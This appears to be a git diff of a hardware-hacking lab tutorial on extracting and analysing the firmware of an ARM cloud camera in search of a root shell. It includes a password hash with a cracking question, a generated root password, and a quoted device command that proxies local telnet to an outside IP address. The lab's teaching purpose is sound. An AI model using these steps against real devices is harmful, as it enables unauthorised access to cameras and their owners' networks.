@@ -10,11 +10,22 @@ tags:
   - Reverse Engineering
 ---
 
-#WARNING WIP!
+# WARNING WIP!
 
-#ARM Cloud Conected Camera 
+# ARM Cloud Conected Camera 
 
 This example will be looking for ways to get a root shell on this camera. 
+
+![cloud camera front](/images/Cloudipcam_front.jpg)
+![cloud camera back](/images/Cloudipcam_back.jpg)
+
+## Extraction
+
+Unlike the previous device we can take another route, for this I was able to get a u-boot shell but I didn't want to take all day to get a read of the flash chip. 
+
+![cloud camera front](/images/Cloudipcam_UART_pins.jpg)
+
+The UART runs at 38.4k baud so I used the hot air wand on the PCB rework station to remove the chip and loaded it in a socket to read.
 
 Run binwalk on the file and note the important addresses.
 
@@ -44,13 +55,15 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 
 Why is 0x0 through 0xC00000 big endian and 0xC00000 onwards little endian? What does this even mean? Consider the following strings:
 
-0123456789ABCDEF
-32107654BA98FEDC
+## 0123456789ABCDEF
+
+## 32107654BA98FEDC
 
 The second has every four characters in reversed order
 
-**0123** 4567 89AB CDEF
-**3210** 7654 BA98 FEDC
+## **0123** 4567 89AB CDEF
+
+## **3210** 7654 BA98 FEDC
 
 The data stored in the first section of memory is just ordered differently than the second, we can fix that by splitting the file.
 
@@ -99,9 +112,9 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 ```
 
 If you feel like a tangent you can check the following URLs: 
-https://en.wikipedia.org/wiki/Endianness
-https://en.wikipedia.org/wiki/Endianness#Bi-endianness
-https://xkcd.com/927/ Welp...
+[https://en.wikipedia.org/wiki/Endianness](https://en.wikipedia.org/wiki/Endianness)
+[https://en.wikipedia.org/wiki/Endianness#Bi-endianness](https://en.wikipedia.org/wiki/Endianness#Bi-endianness)
+[https://xkcd.com/927/](https://xkcd.com/927/) Welp...
 
 Finally we can extract the entire filesystem at once.
 
@@ -112,7 +125,7 @@ ls -laht _cloudipcamera_mxic25l12835f.BIN.merge.extracted/
 ```
 
 There are multiple jffs2 root filesystems, this is caused by the way jffs2 works. The jffs2 folders other than "**jffs2-root**" can be ignored for our purposes going forward.
-Tangent URL: https://www.sourceware.org/jffs2/jffs2-html/
+Tangent URL: [https://www.sourceware.org/jffs2/jffs2-html/](https://www.sourceware.org/jffs2/jffs2-html/)
 Flash storage is weird.
 
 Next lets look for the root filesystem, dig into the extracted D340D file.
@@ -160,7 +173,7 @@ drwxr-xr-x  3 rjmendez rjmendez 4.0K Feb 17 21:51 ..
 
 Feel free to explore here, what can you learn about the operating system?
 
-##Question: What type of password hash is this? "$1$EWHkEni4$49Oju3YI08z3ERvxPpL2H0"
+## Question: What type of password hash is this? "$1$EWHkEni4$49Oju3YI08z3ERvxPpL2H0"
     Bonus: What is the password? :D
 
 Go into the project folder on the root of the filesystem and extract the archive there.
@@ -171,7 +184,7 @@ unlzma -c ipc_project_v1.9.5.1510231507.rtl8188.tar.lzma > project.tar
 tar xvf project.tar
 ```
 
-##Question: What is inside of this archive?
+## Question: What is inside of this archive?
 
 Inspect the contents of the following folders. A valuable tool is grep, try using grep to answer the following question.
 
@@ -181,7 +194,7 @@ apps/app/ipc/data/default/
 ```
 A valuable tool is grep, try using grep to answer the following question. Use ```man grep``` to learn how to recursively search a path and ignore case or even search within binary files. If you plan to search binary files you will get better results running the grep output through strings as well.
 
-##Question: What is the device serial number?
+## Question: What is the device serial number?
 
 Inspect the files below.
 
@@ -190,11 +203,11 @@ apps/app/ipc/data/sh/sd_card_insert.sh
 apps/app/ipc/data/sh/dev_telnet.sh
 ```
 
-##Question: What would these scripts let us do? How would you attack this camera?
+## Question: What would these scripts let us do? How would you attack this camera?
 
-#WINNING
+# WINNING
 
-#Mitigation of remote attack
+# Mitigation of remote attack
 
 Inspect the following shell script.
 
@@ -202,7 +215,7 @@ Inspect the following shell script.
 apps/app/ipc/data/sh/dev_passwd.sh
 ```
 
-##Question: How is the root password randomized? What is generating the password?
+## Question: How is the root password randomized? What is generating the password?
 
 Lets look at this magical tool that generates our random password!
 
@@ -306,12 +319,12 @@ cat /tmp/pass
 d3d9446802a44259755d38e6d163e820
 ```
 
-##Question and final exercise: What do these MPIC binaries do?
+## Question and final exercise: What do these MPIC binaries do?
 
-#WTF?
+# WTF Section
 
-##Question: What is the shell script with the hardcoded password for user 13510633251?
-##Question: What does this look like its doing? 
+## Question: What is the shell script with the hardcoded password for user 13510633251?
+## Question: What does this look like its doing? 
 ```
 mipc_tool -cmd tcpproxy --passive-remote 127.0.0.1:23 --remote 218.14.146.199:7024:/tmp/tcp_post.txt --header-notify-file /tmp/tcp_notify.txt --keep-running enable --keep-alive 300000
 ```
